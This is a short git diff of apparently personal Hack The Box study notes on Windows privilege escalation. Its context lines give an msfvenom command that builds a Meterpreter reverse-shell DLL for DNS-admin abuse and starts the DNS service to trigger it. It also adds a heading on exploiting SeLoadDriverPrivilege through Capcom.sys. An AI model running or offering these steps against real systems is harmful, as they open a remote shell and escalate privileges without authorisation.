@@ -1,5 +1,5 @@
 DNS admin
-
+----------
 # Create reverseshell.dll file with msfvenom
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4242 -f dll -o reverseshell.dll
@@ -30,4 +30,8 @@ sc.exe start dns
 # Finally get meterpreter reverseshell
 
 <img width="824" height="313" alt="image" src="https://github.com/user-attachments/assets/9abe16e6-a664-467b-bb13-a883d1c5a054" />
-
+_______________________________________________________________________________________________________________________________________
+SeLoadDriverPrivilege (Exploit the Capcom.sys)
+----------------------
+In HTB > Windows Privilege Escalation > Windows Group Privilege > Print Operators
+_______________________________________________________________________________________________________________________________________
